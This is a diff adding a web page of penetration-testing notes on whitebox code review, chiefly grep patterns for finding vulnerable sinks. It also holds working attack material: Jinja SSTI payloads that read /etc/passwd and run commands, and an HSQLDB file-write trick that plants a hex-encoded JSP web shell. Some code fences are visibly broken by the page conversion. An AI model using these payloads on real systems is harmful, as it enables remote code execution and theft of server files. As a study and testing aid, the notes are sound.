@@ -1,0 +1,455 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="readloud">
+    
+    <link rel="shortcut icon" href="../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Whitebox / Code Review Methodologies &amp; Tips - readloud.org</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Whitebox / Code Review Methodologies \u0026amp; Tips", url: "#_top", children: [
+              {title: "Quick Greps", url: "#quick-greps" },
+          ]},
+          {title: "Eval (For nodeJS or Java)", url: "#eval-for-nodejs-or-java", children: [
+          ]},
+          {title: "XSS", url: "#xss", children: [
+          ]},
+          {title: "XXE Injection or at least XML", url: "#xxe-injection-or-at-least-xml", children: [
+              {title: "Java", url: "#java" },
+          ]},
+          {title: "File System interactions", url: "#file-system-interactions", children: [
+              {title: "Java", url: "#java_1" },
+              {title: "File Upload", url: "#file-upload" },
+              {title: "How to track a possible vulnerable function resides?", url: "#how-to-track-a-possible-vulnerable-function-resides" },
+              {title: "Debugging", url: "#debugging" },
+              {title: "PHP", url: "#php" },
+              {title: "XXE (XML External Entity)", url: "#xxe-xml-external-entity" },
+              {title: "Java", url: "#java_2" },
+              {title: "JavaScript / NodeJS", url: "#javascript-nodejs" },
+              {title: ".NET Applications", url: "#net-applications" },
+              {title: "Deserialization", url: "#deserialization" },
+              {title: "Procmon", url: "#procmon" },
+              {title: "Burp", url: "#burp" },
+              {title: "Websockets", url: "#websockets" },
+              {title: "Building Scripts", url: "#building-scripts" },
+              {title: "Remote Debugging", url: "#remote-debugging" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+
+    <h1 id="whitebox-code-review-methodologies-tips">Whitebox / Code Review Methodologies &amp; Tips</h1>
+<h2 id="quick-greps">Quick Greps</h2>
+<ul>
+<li>Quick grep commands that may find direct vulnerabilities or used for recon purposes that gives you the lay of the land and tells you about the web application you're dealing with</li>
+<li>These grep commands may not directly give you indication of for example <em>Deserialization</em> attack vectors but may give a hint</li>
+<li>Tips</li>
+<li>Narrow down to individual folders if searching from root directory takes too long</li>
+<li>Zoom out on your terminal first before grepping</li>
+</ul>
+<h1 id="eval-for-nodejs-or-java">Eval (For nodeJS or Java)</h1>
+<p>```grep -Ri "eval(" * --color
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>#SQLI
+</span></code></pre></div>
+egrep -ri "^.<em>?['\"]SELECT.</em>?['\"]\ ?[+.]" *
+egrep -Ri "^.<em>?['\"]UPDATE.</em>?SET.<em>?['\"]\ ?[+.]" *
+egrep -Ri "^.</em>?['\"]INSERT INTO.*?['\"]\ ?[+.]" *
+grep -Ri "queryForList("
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a># Deserialization
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>## Java
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>```egrep -Ri &quot;readObject\(\)&quot; *
+</span></code></pre></div></p>
+<h1 id="xss">XSS</h1>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>grep -r &quot;document.write(&quot; ./ --include &quot;*.html&quot;
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>grep -Ri &quot;&lt;script src=\&quot;&#39; +&quot;
+</span></code></pre></div>
+<h1 id="xxe-injection-or-at-least-xml">XXE Injection or at least XML</h1>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>grep -Ri &quot;= new HashMap&quot; *
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>grep -Ri &quot;= document.getElementsByTagName(&quot;
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>grep -Ri &quot;document.getDocumentElement()&quot;
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>grep -Ri &quot;getNodeValue()&quot;
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>grep -Ri &quot;getNodeValue()&quot;
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>grep -Ri &quot;NodeList&quot;
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>grep -Ri &quot;java.util.HashMap&quot;
+</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>grep -Ri &quot;&lt;\!\[CDATA\[&quot; *
+</span></code></pre></div>
+<h2 id="java">Java</h2>
+<p>```egrep -ri "XmlUtil.java" *
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a># SSTI
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>```grep -Ri &quot;.render(&quot; *
+</span></code></pre></div></p>
+<h1 id="file-system-interactions">File System interactions</h1>
+<h2 id="java_1">Java</h2>
+<p><code>``grep -Ri "new FileReader(" *
+<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a># Weak Random
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>## Java
+</span></code></pre></div>
+grep -Ri "import java.util.Random" *
+grep -Ri "new Random(" *
+<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a># Websockets
+</span></code></pre></div>
+grep -Ri "= new WebSocket(" *
+grep -Ri "WebSocket(" *
+grep -r "send(" ./ --exclude="compressed*" --exclude="*.js"
+<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a># API
+</span></code></pre></div>
+grep -Ri "swagger"
+grep -Ri "/api" *
+<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a># Command Injection
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>## Linux
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>`grep -Ri &quot;\&quot;su&quot; --exclude &quot;*.js&quot; --exclude &quot;*.html&quot; --exclude &quot;*.css&quot; --exclude &quot;*.svg&quot; --exclude &quot;*.scss&quot;`
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>## Windows
+</span></code></pre></div>
+"cmd.exe (.*) /c 
+"cmd (.*) /c "
+"powershell (.*) -c "
+"powershell (.*) -command "
+"powershell.exe (.*) -c "
+"powershell.exe (.*) -command "
+<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a># Deserialization
+</span></code></pre></div>
+grep -Ri ".GetType(" *
+grep -Ri ".GetType().AssemblyQualifiedName" *
+grep -Ri "XmlSerializer(" *
+grep -Ri "Serializer" *
+grep -Ri ".Serialize(" *
+grep -Ri ".Deserialize(" *
+grep -Ri "= new XmlDocument()" *
+grep -Ri "XmlDocument()" *
+grep -Ri "DeSerializeHashtable" *
+grep -Ri "XmlUtils.DeSerializeHashtable" *
+<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>## SSTI
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>* Detailed SSTI meaning [here](./SSTI)
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>* Test
+</span></code></pre></div>
+    {{7*7}}
+<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>* Jinja Payload
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>* Python2
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>
+</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>``` {{ &#39;&#39;.__class__.__mro__[2].__subclasses()[40](&#39;/etc/passwd&#39;).read() }}
+</span></code></pre></div>
+* Python3
+<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>        {{ &#39;&#39;.__class__.__mro__[1].__subclasses()[40](&#39;/etc/passwd&#39;).read() }}
+</span></code></pre></div>
+* the number</code>[420]` may change every instance. This is the subprocess.Popen for RCE
+<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>        {% set string = &quot;ssti&quot; %}
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>        {% set class = &quot;__class__&quot; %}
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>        {% set mro = &quot;__mro__&quot; %}
+</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>        {% set subclasses = &quot;__subclasses__&quot; %}
+</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>        {% set mro_r = string|attr(class)|attr(mro) %}
+</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>        {% set subclasses_r = mro_r[1]|attr(subclasses)() %}
+</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a>        {{ subclasses_r[420]([&quot;/usr/bin/touch&quot;,&quot;/tmp/poc.txt&quot;]) }}
+</span></code></pre></div></p>
+<h2 id="file-upload">File Upload</h2>
+<ul>
+<li>Whitebox</li>
+<li>Try to upload a file and see where it is uploaded on the file system by using <code>find</code> or <code>grep</code></li>
+<li>Find writable directories
+<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>        find /var/www/html/ -type d -perm -o+w
+</span></code></pre></div></li>
+<li>File upload via Zip?</li>
+<li>Try directory traversal to <code>/tmp</code></li>
+<li>find writable directories on the web root</li>
+<li>PHP</li>
+<li>make use of <code>display_errors</code> in the PHP settings</li>
+</ul>
+<h2 id="how-to-track-a-possible-vulnerable-function-resides">How to track a possible vulnerable function resides?</h2>
+<ul>
+<li>can start from top to bottom. From controllers, <code>grep</code> for the <something>.phtml or <something>.html. It might give some idea on where it is</li>
+</ul>
+<h2 id="debugging">Debugging</h2>
+<ul>
+<li>Python SMTP Server[^1]</li>
+<li>MySQL/MariaDB</li>
+<li>Find the config files
+<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>        sudo find / -name &quot;my*.cnf&quot; 2&gt;/dev/null
+</span></code></pre></div></li>
+<li><code>/etc/mysql/my.cnf</code> or <code>/etc/my.cnf.d/mysql-server.cnf</code> (restart service after)
+<div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>        general_log_file = /var/log/mysql/mysql.log
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>        general_log = 1
+</span></code></pre></div></li>
+<li>After Change
+<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>        sudo systemctl restart mysql
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>        sudo tail -f /var/log/mysql/mysql.log
+</span></code></pre></div></li>
+<li>PostgreSQL</li>
+<li>postgresql.conf
+<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>        log_statement = &#39;all&#39; # none, ddl, mod, all
+</span></code></pre></div></li>
+<li>Restart service (systemctl or services.msc)</li>
+<li>Execute commands directly using</li>
+<li>PGAdmin software/GUI</li>
+<li><code>psql.exe -U postgres -p 15432</code></li>
+<li>PHP</li>
+<li><code>/etc/php5/apache2/php.ini</code></li>
+<li><code>display_errors = On</code></li>
+<li>HSQLDB</li>
+<li>Connect
+<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>        java -cp ./hsqldb.jar org.hsqldb.util.DatabaseManagerSwing --url jdbc:hsqldb:hsql://webappserver:9001/DB123 --user sa --password coolAid99
+</span></code></pre></div></li>
+<li>RCE via java routines</li>
+<li>Checking for properties kind of RCE (Recon phase)</li>
+<li>Setup function
+        <div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>        CREATE FUNCTION systemprop(IN key VARCHAR) RETURNS VARCHAR
+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>        LANGUAGE JAVA
+</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>        DETERMINISTIC NO SQL
+</span><span id="__span-20-4"><a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a>        EXTERNAL NAME &#39;CLASSPATH:java.lang.System.getProperty&#39;
+</span></code></pre></div></li>
+<li>Execute with
+        <div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>        VALUES(systemprop(&#39;java.class.path&#39;))
+</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>        VALUES(systemprop(&#39;user.dir&#39;))
+</span></code></pre></div></li>
+<li>Search for good classes to use (regex)
+    <div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>        public static void \w+\(String
+</span></code></pre></div></li>
+<li>SQL to Write Files using shared Java libraries</li>
+<li>Create function
+        <div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>        CREATE PROCEDURE writeBytesToFilename1(IN paramString1 VARCHAR, IN paramArrayOfByte1 VARBINARY(1024))
+</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>        LANGUAGE JAVA
+</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>        DETERMINISTIC NO SQL
+</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a>        EXTERNAL NAME
+</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a>        &#39;CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename&#39;
+</span></code></pre></div></li>
+<li>Call the function
+        <div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>        call writeBytesToFilename1(&#39;test.txt&#39;,cast (&#39;6f6820796573&#39; AS VARBINARY(1024)))
+</span></code></pre></div></li>
+<li>Reverse shell (JSP)</li>
+<li><strong>IMPORTANT</strong> It must fit within 1024 bytes
+        <div class="language-text highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>        call writeBytesToFilename1(&#39;../../somejavadir/webapp/ROOT/cmdjsp.jsp&#39;,cast (&#39;2f2f206e6f74652074686174206c696e7578203d20636d6420616e642077696e646f7773203d2022636d642e657865202f63202b20636d6422200a0a3c464f524d204d4554484f443d47455420414354494f4e3d27636d646a73702e6a7370273e0a3c494e505554206e616d653d27636d642720747970653d746578743e0a3c494e50555420747970653d7375626d69742076616c75653d2752756e273e0a3c2f464f524d3e0a0a3c2540207061676520696d706f72743d226a6176612e696f2e2a2220253e0a3c250a202020537472696e6720636d64203d20726571756573742e676574506172616d657465722822636d6422293b0a202020537472696e67206f7574707574203d2022223b0a0a202020696628636d6420213d206e756c6c29207b0a202020202020537472696e672073203d206e756c6c3b0a202020202020747279207b0a20202020202020202050726f636573732070203d2052756e74696d652e67657452756e74696d6528292e6578656328636d64293b0a2020202020202020204275666665726564526561646572207349203d206e6577204275666665726564526561646572286e657720496e70757453747265616d52656164657228702e676574496e70757453747265616d282929293b0a2020202020202020207768696c65282873203d2073492e726561644c696e6528292920213d206e756c6c29207b0a2020202020202020202020206f7574707574202b3d20733b0a2020202020202020207d0a2020202020207d0a202020202020636174636828494f457863657074696f6e206529207b0a202020202020202020652e7072696e74537461636b547261636528293b0a2020202020207d0a2020207d0a253e0a0a3c7072653e0a3c253d6f757470757420253e0a3c2f7072653e0a0a3c212d2d20202020687474703a2f2f6d69636861656c6461772e6f726720202032303036202020202d2d3e0a&#39; AS VARBINARY(900)))
+</span></code></pre></div></li>
+</ul>
+<h2 id="php">PHP</h2>
+<ul>
+<li>Interactive Shell</li>
+<li>Make sure to do this on the debug/target server since versions may be different
+<div class="language-text highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>    # Type juggling as example (php )
+</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>    user@webapp:~$ php -a
+</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a>    Interactive mode enabled
+</span><span id="__span-26-4"><a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a>
+</span><span id="__span-26-5"><a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a>    php &gt; echo md5(&#39;240610708&#39;);
+</span><span id="__span-26-6"><a id="__codelineno-26-6" name="__codelineno-26-6" href="#__codelineno-26-6"></a>    0e462097431906509019562988736854
+</span><span id="__span-26-7"><a id="__codelineno-26-7" name="__codelineno-26-7" href="#__codelineno-26-7"></a>
+</span><span id="__span-26-8"><a id="__codelineno-26-8" name="__codelineno-26-8" href="#__codelineno-26-8"></a>    php &gt; var_dump(&#39;0e462097431906509019562988736854&#39; == &#39;0&#39;);
+</span><span id="__span-26-9"><a id="__codelineno-26-9" name="__codelineno-26-9" href="#__codelineno-26-9"></a>    bool(true)
+</span></code></pre></div></li>
+<li>Watch out for type juggling</li>
+<li>Find value that compares with a generated substring of a hash</li>
+<li>If a user controlled input is part of a comparison with only <code>==</code> rather than <code>===</code>, and the other might be <code>0e\d\d\d\d\d</code> then it would result (where m = user input)
+<div class="language-text highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>        if ($code == $m) {
+</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>        if (0eDDDDDDDD == 0) {
+</span></code></pre></div></li>
+<li>If within array($argument), it is proper/sanitized</li>
+<li>Edit the PHP file to debug, then restart web server/web app</li>
+<li>got something out by setting <code>header ('Location: ')+$string</code> for example</li>
+<li>Create test php functions to verify values on the server itself
+<div class="language-text highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>    # nano /var/www/html/magic.php
+</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>    &lt;?php
+</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a>    var_dump(get_magic_quotes_gpc());
+</span><span id="__span-28-4"><a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a>    ?&gt;
+</span><span id="__span-28-5"><a id="__codelineno-28-5" name="__codelineno-28-5" href="#__codelineno-28-5"></a>
+</span><span id="__span-28-6"><a id="__codelineno-28-6" name="__codelineno-28-6" href="#__codelineno-28-6"></a>    # Retrieve value
+</span><span id="__span-28-7"><a id="__codelineno-28-7" name="__codelineno-28-7" href="#__codelineno-28-7"></a>    curl http://localhost/magic.php
+</span></code></pre></div></li>
+<li>Parameter Pollution to create errors to find the root directory
+<div class="language-text highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>    # Example
+</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>
+</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a>    ## Valid
+</span><span id="__span-29-4"><a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a>    http://host/webapp/somefunction.php?number=&amp;search=test
+</span><span id="__span-29-5"><a id="__codelineno-29-5" name="__codelineno-29-5" href="#__codelineno-29-5"></a>
+</span><span id="__span-29-6"><a id="__codelineno-29-6" name="__codelineno-29-6" href="#__codelineno-29-6"></a>    ## Invalid - Target
+</span><span id="__span-29-7"><a id="__codelineno-29-7" name="__codelineno-29-7" href="#__codelineno-29-7"></a>    http://host/webapp/somefunction.php?number=&amp;search[]=test
+</span><span id="__span-29-8"><a id="__codelineno-29-8" name="__codelineno-29-8" href="#__codelineno-29-8"></a>
+</span><span id="__span-29-9"><a id="__codelineno-29-9" name="__codelineno-29-9" href="#__codelineno-29-9"></a>    # Now find a writable directory
+</span><span id="__span-29-10"><a id="__codelineno-29-10" name="__codelineno-29-10" href="#__codelineno-29-10"></a>    find /var/www/html/ -type d -perm -o+w
+</span></code></pre></div></li>
+<li>Start with public entities in authentication bypass portion
+<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>    grep -rnw /var/www/html/webapp -e &quot;^.*user_location.*public.*&quot; --color
+</span></code></pre></div></li>
+</ul>
+<h2 id="xxe-xml-external-entity">XXE (XML External Entity)</h2>
+<ul>
+<li>Find in code for possible usage of XML
+<div class="language-java highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="w">    </span><span class="n">egrep</span><span class="w"> </span><span class="o">-</span><span class="n">ri</span><span class="w"> </span><span class="s">&quot;XmlUtil.java&quot;</span><span class="w"> </span><span class="o">*</span>
+</span></code></pre></div></li>
+<li><a href="../xxe_injection/">More XXE</a></li>
+</ul>
+<h2 id="java_2">Java</h2>
+<ul>
+<li>Know common java packages such as: (do not waste time decompiling these)</li>
+<li><code>struts.jar</code> or <code>xmlsec-1.3.0.jar</code></li>
+<li>Open target .jar file with jd-gui and export</li>
+<li>File -&gt; Save All Sources (Ctrl + Alt + S)</li>
+<li>Open the exported .zip file in notepad++ or sublime text</li>
+<li>Review files such as web.xml to study routings</li>
+<li><code>jshell</code></li>
+<li>Use regex to find SQLi (separate note)</li>
+<li>Random</li>
+<li>beware of which random is used</li>
+<li>java.util.random is vulnerable</li>
+<li>Look for this
+    <div class="language-text highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>        grep -Ri &quot;import java.util.Random;&quot; *
+</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a>        grep -Ri &quot; = new Random(&quot; *
+</span></code></pre></div></li>
+<li>It is <strong>IMPORTANT</strong> to check if debug machine and Kali machine has same time</li>
+<li>Kali may be lagging behind</li>
+<li><code>sudo ntpdate &lt;ntp.server.com&gt;</code></li>
+<li>Just recreate these libraries that needs imitation in Java.</li>
+</ul>
+<h2 id="javascript-nodejs">JavaScript / NodeJS</h2>
+<ul>
+<li><code>node</code> for interactive shell for testing</li>
+<li>Remember when testing that it is much better to do it on the debug machine’s interactive <code>node</code> shell since the version difference can mean a lot and can save/waste a lot of your time.</li>
+<li>find commands that execute and trace
+<div class="language-text highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>    grep -rnw &quot;eval(&quot; . --color
+</span></code></pre></div></li>
+</ul>
+<h2 id="net-applications">.NET Applications</h2>
+<ul>
+<li>Debug using <strong>dnSpy</strong></li>
+<li>Once in <strong>dnSpy</strong>, ++right-button++ on "Edit Assembly Attributes"</li>
+<li>Replace
+<div class="language-text highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>        [assembly:Debuggable(DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints)]
+</span></code></pre></div></li>
+<li>with
+<div class="language-text highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>[assembly: Debuggable(DebuggableAttribute.DebuggingModes.Default |  DebuggableAttribute.DebuggingModes.DisableOptimizations | DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints | DebuggableAttribute.DebuggingModes.EnableEditAndContinue)]
+</span></code></pre></div></li>
+<li>Make use of "Call Stack" and "Watch" (Variable)</li>
+<li>Make use of Breakpoints</li>
+<li>+f9+ - Set</li>
+<li>+f5+ - Continue</li>
+</ul>
+<h2 id="deserialization">Deserialization</h2>
+<ul>
+<li>More <a href="./deserialization">here</a></li>
+<li>Tip</li>
+<li>Use ysoserial test payload</li>
+<li>Combine with <code>sudo dnschef -i 0.0.0.0</code> and perform a simple DNS lookup.</li>
+<li>This means you need to configure the debug machine to make your Kali as its DNS server (just for testing)</li>
+<li>.NET</li>
+<li>Check around, see deserialization, use ysoserial easy PoC payloads</li>
+<li>XML should be good</li>
+<li>Study the functions</li>
+<li>Learn to use VS Community variables</li>
+<li>Java
+<div class="language-text highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>    grep iR &quot;readObject\(\)&quot; *
+</span></code></pre></div></li>
+</ul>
+<h2 id="procmon">Procmon</h2>
+<ul>
+<li>If you could only write files but can’t execute them directly</li>
+<li>Find a file using procmon that gets executed frequently</li>
+<li>Filter using “Path” to the root folder of the application. If not, maybe All has relations to the path or application (i.e. webapp executed vbs)</li>
+</ul>
+<h2 id="burp">Burp</h2>
+<ul>
+<li>In changing method</li>
+<li>Better to change method (GET to POST or vice versa) automatically using ++right-button++ -&gt; <code>Change request method</code> rather than manually changing the text.</li>
+</ul>
+<h2 id="websockets">Websockets</h2>
+<ul>
+<li>Although possible via Burp, you can have a Python script to basically interact with this.</li>
+</ul>
+<h2 id="building-scripts">Building Scripts</h2>
+<ul>
+<li>Make it as simple and modular as possible, nothing fancy.</li>
+<li>From scratch</li>
+<li>You may base on a simple <a href="https://github.com/trojand/Script_Yard/blob/main/TEMPLATE.py">template</a> for starters or from absolute scratch</li>
+<li>Build it bit by bit and print the output at once</li>
